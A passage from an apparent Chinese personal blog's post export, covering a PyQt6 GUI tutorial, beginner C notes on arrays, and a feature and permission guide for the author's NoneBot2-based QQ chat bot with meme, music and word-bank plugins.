<h2 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h2><h3 id="新建一个窗口"><a href="#新建一个窗口" class="headerlink" title="新建一个窗口"></a>新建一个窗口</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: simple.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In this example, we create a simple</span></span><br><span class="line"><span class="string">window in PyQt6.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"><span class="comment">#基础小组件位于 PyQt6.QtWidgets 模块。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">	<span class="comment">#每个 PyQt6 应用程序都必须创建一个应用程序对象。sys.argv 参数是来自命令行的参数列表。Python 脚本可以从 shell 运行，这是应用启动的一种方式。</span></span><br><span class="line">    w = QWidget()</span><br><span class="line">    <span class="comment">#QWidget 小部件是 PyQt6 中所有用户界面对象的基类。我们为 QWidget 提供了默认构造函数。默认构造函数没有父级。没有父级的小部件称为窗口。</span></span><br><span class="line">    w.resize(<span class="number">250</span>, <span class="number">200</span>)</span><br><span class="line">    <span class="comment">#resize 方法改变了小部件的尺寸，现在它250像素宽，150像素高。</span></span><br><span class="line">    w.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">	<span class="comment">#move 方法把小部件移动到屏幕的指定坐标(300, 300)。</span></span><br><span class="line">    w.setWindowTitle(<span class="string">&#x27;Simple&#x27;</span>)</span><br><span class="line">    <span class="comment">#使用 setWindowTitle 给窗口设置标题，标题显示在标题栏</span></span><br><span class="line">    w.show()</span><br><span class="line">	<span class="comment">#show 方法是在屏幕上显示小部件的方法。显示一个部件的步骤是首先在内存里创建，然后在屏幕上显示。</span></span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line">    <span class="comment">#最后，我们进入应用程序的主循环。事件处理从这里开始。主循环从窗口系统接收事件并将它们分派给应用程序小部件。 如果我们调用 exit 方法或主小部件被销毁，则主循环结束。sys.exit 方法确保一个干净的退出。环境将被告知应用程序如何结束。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="创建一个气泡提示"><a href="#创建一个气泡提示" class="headerlink" title="创建一个气泡提示"></a>创建一个气泡提示</h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: tooltip.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This example shows a tooltip on</span></span><br><span class="line"><span class="string">a window and a button.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> (QWidget, QToolTip,</span><br><span class="line">    QPushButton, QApplication)</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QFont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>(<span class="params">QWidget</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initUI</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&#x27;SansSerif&#x27;</span>, <span class="number">10</span>))</span><br><span class="line">		<span class="comment">#这个静态方法给气泡提示框设置了字体，这里使用了10pt 的 SansSerif 字体。</span></span><br><span class="line">        self.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">		<span class="comment">#调用 setTooltip 方法创建气泡提示框，可以使用富文本内容。</span></span><br><span class="line">        btn = QPushButton(<span class="string">&#x27;Button&#x27;</span>, self)</span><br><span class="line">        btn.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">        <span class="comment">#在气泡提示框上添加了一个按钮部件。</span></span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">		<span class="comment">#sizeHint 方法是给按钮一个系统建议的尺寸，然后使用 move 方法移动这个按钮的位置。</span></span><br><span class="line">        self.setGeometry(<span class="number">300</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&#x27;Tooltips&#x27;</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    ex = Example()</span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="示例图片"><a href="#示例图片" class="headerlink" title="示例图片"></a>示例图片</h4><p><img src="https://c.img.dasctf.com/images/20221220/1671532087205-ee9e6d9c-52ad-4e2f-a657-5e5f327ebeaa.png" alt="image-20220201234745997"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671532091494-ea620bbc-b348-4e79-a999-6c293b4b68b2.png" alt="image-20220201234817130"></p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>pyqt6</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之数组篇</title>
    <url>/2022/01/09/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E7%BB%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="数组篇"><a href="#数组篇" class="headerlink" title="数组篇"></a>数组篇</h1><p>循环部分因为有python基础，就快速的过一遍，不作详细记录。直接开始数组篇的学习了哦~</p>
<span id="more"></span>
<h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a><strong>问题</strong></h3><p>如何写一个程序计算用户输入的数字的平均数，并输出所有大于平均数的数？</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//定义数组</span></span><br><span class="line">    <span class="keyword">int</span> number[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	<span class="keyword">while</span>( x!= <span class="number">-1</span> )&#123;</span><br><span class="line">		<span class="comment">//对数组中的元素赋值</span></span><br><span class="line">        number[cnt] = x;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, cnt);</span><br><span class="line">			<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;=cnt; i++ )&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">		sum += x;</span><br><span class="line">		cnt ++;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cnt &gt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum/cnt);</span><br><span class="line">		<span class="keyword">int</span> i ;</span><br><span class="line">		<span class="comment">//遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">			<span class="comment">//使用数组中的元素</span></span><br><span class="line">            <span class="keyword">if</span> (number[i] &gt; sum/cnt)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/09/kAyqGXnPTxUwSo7.png" alt="image-20220109171512344"></p>
<h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><p> &lt;类型&gt;变量名称[元素数量];</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> grades[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">double</span> weight[<span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>注：元素数量必须是整数</p>
<h3 id="什么是数组"><a href="#什么是数组" class="headerlink" title="什么是数组"></a>什么是数组</h3><ul>
<li><p>是一种容器（放东西的东西），特点是：</p>
<p>1、其中的元素具有相同的数据类型</p>
<p>2、一旦创建，不能改变大小</p>
<p>3、*（数组中的元素在内存中是连续依次排列的）</p>
</li>
</ul>
<h3 id="int-a-10"><a href="#int-a-10" class="headerlink" title="int a[10]"></a>int a[10]</h3><ul>
<li>一个int的数组</li>
<li>10个单元：a[0], a[1], a[2], … a[9]</li>
<li>每个单元就是一个int类型的变量</li>
<li>可以出现在赋值的左边或右边</li>
<li>*在赋值左边的叫做左值</li>
</ul>
<h3 id="数组的单元"><a href="#数组的单元" class="headerlink" title="数组的单元"></a>数组的单元</h3><ul>
<li>数组的每个单元就是数组类型的一个变量</li>
<li>使用数组时放在[]中的数字叫做下标或索引，下表从0开始计数</li>
</ul>
<h3 id="有效的下标范围"><a href="#有效的下标范围" class="headerlink" title="有效的下标范围"></a>有效的下标范围</h3><ul>
<li>编译器和运行环境都不会检查数组下标是否越界，无论是对数组单元做读还是写</li>
<li>一旦程序运行，越界的数组访问可能造成问题，导致程序崩溃</li>
<li>segmentation fault</li>
<li>所以这是程序员的责任来保证程序只使用有效的下标值：[0,数组的大小-1]</li>
</ul>
<h3 id="长度为0的数组（图一乐）"><a href="#长度为0的数组（图一乐）" class="headerlink" title="长度为0的数组（图一乐）"></a>长度为0的数组（图一乐）</h3><p>int a[0];</p>
<p>可以存在，但是没用啊。。。</p>
<h3 id="实例练习1"><a href="#实例练习1" class="headerlink" title="实例练习1"></a>实例练习1</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>写一个程序，输入数量不确定的[0,9]范围内的整数，统计每一种数字出现的次数，输入-1表示结束。</p>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p>一个三行五列的矩阵</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="遍历二位数组"><a href="#遍历二位数组" class="headerlink" title="遍历二位数组"></a>遍历二位数组</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++ )&#123;</span><br><span class="line">	<span class="keyword">for</span> ( j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">		a[i][j] = i*j;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二维数组的初始化"><a href="#二维数组的初始化" class="headerlink" title="二维数组的初始化"></a>二维数组的初始化</h3><p><img src="https://c.img.dasctf.com/images/20221219/1671460082421-0f6c1c10-18e0-4495-9862-b45a5224075d.png" alt="image-20221219221744702"></p>
<h3 id="井字棋游戏实例"><a href="#井字棋游戏实例" class="headerlink" title="井字棋游戏实例"></a>井字棋游戏实例</h3><p><img src="https://c.img.dasctf.com/images/20221219/1671460382426-e684b8e7-ebf8-4795-b354-c5916d64b935.png" alt="image-20221219223248599"></p>
<p><img src="https://c.img.dasctf.com/images/20221219/1671460401459-83f59b68-80f7-46a7-bdac-197d749ae92b.png" alt="image-20221219223319614"></p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>一只枫酱</title>
    <url>/2021/12/28/%E4%B8%80%E5%8F%AA%E6%9E%AB%E9%85%B1/</url>
    <content><![CDATA[<h1 id="枫酱的功能简介"><a href="#枫酱的功能简介" class="headerlink" title="枫酱的功能简介"></a>枫酱的功能简介</h1><p>自己搭的一个小bot，写一下功能说明书。（此bot为自己开发搭建，本人水平极其有限，插件大多为白嫖或二开，少部分原创）。功能仍在持续更新中。</p>
<p>1.25日更新：全架构更新，由nonebot2的a版本升级到了b版本。全插件更新，删除了抽卡、翻译插件（更新不了）。增加了更多的插件和功能。</p>
<span id="more"></span>
<h2 id="群聊-amp-私聊"><a href="#群聊-amp-私聊" class="headerlink" title="群聊&amp;私聊"></a>群聊&amp;私聊</h2><h3 id="B站推送"><a href="#B站推送" class="headerlink" title="B站推送"></a>B站推送</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-hanayori"><em>基于NoneBot2的B站动态推送与开播提醒插件</em> </a></p>
<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>超级用户(主人)、群主、管理员、私聊</p>
<h4 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h4><p><strong>在群聊中使用格式</strong>：@机器人 指令 UID</p>
<p><strong>在私聊中使用格式</strong>：指令 UID</p>
<p><strong>所有指令如下：</strong></p>
<ol>
<li><strong>关注 UID</strong> 添加新主播，UID为主播的B站UID</li>
<li><strong>取关 UID</strong> 取关主播，UID为主播的B站UID</li>
<li><strong>列表</strong> 显示当前关注列表</li>
<li><strong>开启动态 UID</strong> 开启B站动态推送</li>
<li><strong>关闭动态 UID</strong> 关闭B站动态推送</li>
<li><strong>开启直播 UID</strong> 开启开播提醒</li>
<li><strong>关闭直播 UID</strong> 关闭开播提醒</li>
<li><strong>开启全体 UID</strong> 开启开播@全体成员</li>
<li><strong>关闭全体 UID</strong> 关闭开播@全体成员</li>
<li><strong>帮助</strong> 顾名思义</li>
</ol>
<h4 id="示例图"><a href="#示例图" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/exHihP6n5op2Aqy.png" alt="image-20211228235235538"></p>
<p><img src="https://s2.loli.net/2021/12/28/mXp7Aj6i41wa2bQ.png" alt="123"></p>
<h3 id="沙雕图片"><a href="#沙雕图片" class="headerlink" title="沙雕图片"></a>沙雕图片</h3><h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-petpet">制作头像相关的表情包</a></p>
<h4 id="权限-1"><a href="#权限-1" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-1"><a href="#使用格式-1" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li>指令 + @user，如： 爬 @小Q</li>
<li>指令 + qq号，如：爬 123456</li>
<li>指令 + 自己，如：爬 自己</li>
<li>指令 + 图片</li>
</ul>
<h4 id="全部指令"><a href="#全部指令" class="headerlink" title="全部指令"></a>全部指令</h4><ul>
<li>摸、摸摸、rua</li>
<li>亲、亲亲</li>
<li>贴、贴贴、蹭、蹭蹭</li>
<li>顶、玩</li>
<li>拍</li>
<li>撕(很危险，不开放)</li>
<li>丢、扔</li>
<li>爬</li>
<li>精神支柱</li>
<li>一直</li>
<li>小天使</li>
<li>加载中</li>
<li>一样</li>
<li>不要靠近</li>
<li>玩游戏</li>
</ul>
<h4 id="示例图-1"><a href="#示例图-1" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/IDzHLvUETn8qB9m.png" alt="image-20211228235543472"></p>
<p><img src="https://s2.loli.net/2021/12/28/3x9VL4KvQ8fBDYr.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/V7b9KwqriegvCJL.png" alt="image-20211228235645656"></p>
<h3 id="表情包生成"><a href="#表情包生成" class="headerlink" title="表情包生成"></a>表情包生成</h3><h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-memes">用于表情包制作</a></p>
<h4 id="权限-2"><a href="#权限-2" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-2"><a href="#使用格式-2" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字。多段文字中间要加空格。（可以使用<code>表情包制作</code>关键词获取全部指令）</p>
<h4 id="全部指令-1"><a href="#全部指令-1" class="headerlink" title="全部指令"></a>全部指令</h4><p><img src="https://s2.loli.net/2022/01/26/EZqNIoelThGDSgC.png" alt="image-20220126224647434"></p>
<h4 id="示例图-2"><a href="#示例图-2" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/f9QFwq82g6k7xXy.png" alt="image-20211228235848593"></p>
<p><img src="https://s2.loli.net/2021/12/29/IMgxpd3JWwDsoEz.png" alt="image-20211229000233636"></p>
<h3 id="emoji合成"><a href="#emoji合成" class="headerlink" title="emoji合成"></a>emoji合成</h3><p>如果下载出错，则是api连接失败，等等再玩。</p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-emojimix">适用于 nonebot2的 emoji 合成器</a></p>
<h4 id="权限-3"><a href="#权限-3" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-3"><a href="#使用格式-3" class="headerlink" title="使用格式"></a>使用格式</h4><p>[emoji1]+[emoji2]</p>
<h4 id="示例图-3"><a href="#示例图-3" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/MZNJtwbOjvfQr98.png" alt="image-20220126231118684"></p>
<h3 id="logo生成"><a href="#logo生成" class="headerlink" title="logo生成"></a>logo生成</h3><h4 id="参考链接-4"><a href="#参考链接-4" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-logo">用于xxxxHub 等风格logo制作</a></p>
<h4 id="权限-4"><a href="#权限-4" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-4"><a href="#使用格式-4" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字（注意有分段的要加空格）</p>
<h4 id="全部指令-2"><a href="#全部指令-2" class="headerlink" title="全部指令"></a>全部指令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ph Porn Hub</span><br><span class="line">yt You Tube</span><br><span class="line">5000兆 我去 初音未来</span><br><span class="line">douyin douyin</span><br><span class="line">google Google</span><br></pre></td></tr></table></figure>
<h4 id="示例图-4"><a href="#示例图-4" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/vWlkBGOp25zxXY4.png" alt="image-20220126232255742"></p>
<h3 id="人生重开模拟器"><a href="#人生重开模拟器" class="headerlink" title="人生重开模拟器"></a>人生重开模拟器</h3><h4 id="参考链接-5"><a href="#参考链接-5" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-remake">适用于Nonebot2的人生重开模拟器</a></p>
<h4 id="权限-5"><a href="#权限-5" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-5"><a href="#使用格式-5" class="headerlink" title="使用格式"></a>使用格式</h4><p>@枫酱 remake/liferestart/人生重开/人生重来</p>
<h4 id="示例图-5"><a href="#示例图-5" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VjKS3k6d9sz8lxa.jpg" alt="img"></p>
<h4 id="注"><a href="#注" class="headerlink" title="注"></a>注</h4><p>私聊模式下，没有群聊转发功能，会出现大段文字。下一个插件彩云小梦续写相同。</p>
<h3 id="AI续写"><a href="#AI续写" class="headerlink" title="AI续写"></a>AI续写</h3><h4 id="参考链接-6"><a href="#参考链接-6" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-caiyunai">采用小梦续写</a></p>
<h4 id="权限-6"><a href="#权限-6" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-6"><a href="#使用格式-6" class="headerlink" title="使用格式"></a>使用格式</h4><p>@机器人 续写/彩云小梦 xxx</p>
<h4 id="示例图-6"><a href="#示例图-6" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/7zTqjiWrDfH3X6N.jpg" alt="img"></p>
<h3 id="网易云点歌"><a href="#网易云点歌" class="headerlink" title="网易云点歌"></a>网易云点歌</h3><h4 id="参考链接-7"><a href="#参考链接-7" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/maxesisn/nonebot_plugin_songpicker2">数据源为网易云音乐</a></p>
<h4 id="权限-7"><a href="#权限-7" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-7"><a href="#使用格式-7" class="headerlink" title="使用格式"></a>使用格式</h4><p>点歌+歌曲名，从插件所给的候选项中选择歌曲。</p>
<h4 id="示例图-7"><a href="#示例图-7" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/l7yZecAtj8O1naH.png" alt="image-20220126232857472"></p>
<h3 id="塔罗牌占卜"><a href="#塔罗牌占卜" class="headerlink" title="塔罗牌占卜"></a>塔罗牌占卜</h3><p>根据初代作者所说，塔罗牌准确度并不高，图一乐即可。群聊转发模式有bug，开启后会报错，暂时无法解决，只能一张一张地发。</p>
<h4 id="参考链接-8"><a href="#参考链接-8" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_tarot">塔罗牌</a></p>
<h4 id="权限-8"><a href="#权限-8" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-8"><a href="#使用格式-8" class="headerlink" title="使用格式"></a>使用格式</h4><p>塔罗牌/占卜</p>
<h4 id="示例图-8"><a href="#示例图-8" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VgmwliW96XJvRKT.png" alt="image-20220126230507765"></p>
<h3 id="AI聊天（原创）"><a href="#AI聊天（原创）" class="headerlink" title="AI聊天（原创）"></a>AI聊天（原创）</h3><p>采用腾讯云自然语言处理闲聊功能。</p>
<h4 id="权限-9"><a href="#权限-9" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-9"><a href="#使用格式-9" class="headerlink" title="使用格式"></a>使用格式</h4><p>理论上应该是匹配“枫酱，”（中文逗号）。</p>
<p>但是莫名其妙出了bug，匹配“枫酱”亦可以运行。</p>
<p>不知道啥原因。。。建议第一种吧，不要去挑战bug。</p>
<p><strong>格式：</strong></p>
<p>枫酱，/枫酱+想说的话</p>
<h4 id="示例图-9"><a href="#示例图-9" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/y3l5FuQWeodx1OS.png" alt="img"></p>
<h4 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h4><p>同样加入了输入的黑名单检测功能。请不要触发敏感词。具体请参考wordbank中的额外部分。</p>
<h3 id="wordbank（白嫖-深度二开）"><a href="#wordbank（白嫖-深度二开）" class="headerlink" title="wordbank（白嫖+深度二开）"></a>wordbank（白嫖+深度二开）</h3><p>哇，终于到这插件了。。。</p>
<h4 id="参考链接-9"><a href="#参考链接-9" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/Joenothing-lst/word-bank"><em>无数据库的轻量问答插件</em> </a></p>
<h4 id="权限（深度修改过）"><a href="#权限（深度修改过）" class="headerlink" title="权限（深度修改过）"></a>权限（深度修改过）</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">超级用户</th>
<th style="text-align:center">群主</th>
<th style="text-align:center">群管理</th>
<th style="text-align:center">私聊好友</th>
<th style="text-align:center">群好友</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">增加词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">增加全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全部词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>注：私聊好友个人也可以建立属于自己的词库，与群词库是同级且独立的。</li>
</ul>
<h4 id="使用格式-10"><a href="#使用格式-10" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li><p>使用方法：</p>
<ul>
<li><p>设置词条命令由<code>问句</code>和<code>答句</code>组成。设置之后，收到<code>消息</code>时触发。并非所有人都可以设置词条，详见<a href="https://github.com/Joenothing-lst/word-bank#permission">权限</a></p>
</li>
<li><p><code>问句</code>及其关键字</p>
<ul>
<li><p>问，当<code>问句</code>和<code>消息</code>全等时才会匹配（所有人均可以使用）<br>例子：问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | -          |<br>| 你不理我 | -          |</p>
</li>
<li><p>模糊问，当<code>问句</code>出现在<code>消息</code>里时则会匹配（只有超级用户可以使用）<br>例子：模糊问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | -          |</p>
</li>
<li><p>正则问，当<code>问句</code>被<code>消息</code>正则捕获时则会匹配（只有超级用户可以使用）<br>例子：正则问[他你]不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | 你被屏蔽了 |</p>
</li>
<li><p>全局问，在所有群聊和私聊中都可以触发，可以和以上几种组合使用。（只有超级用户可以使用）<br>例子：全局模糊问不理我答你被屏蔽了</p>
</li>
</ul>
</li>
<li><p><code>答句</code></p>
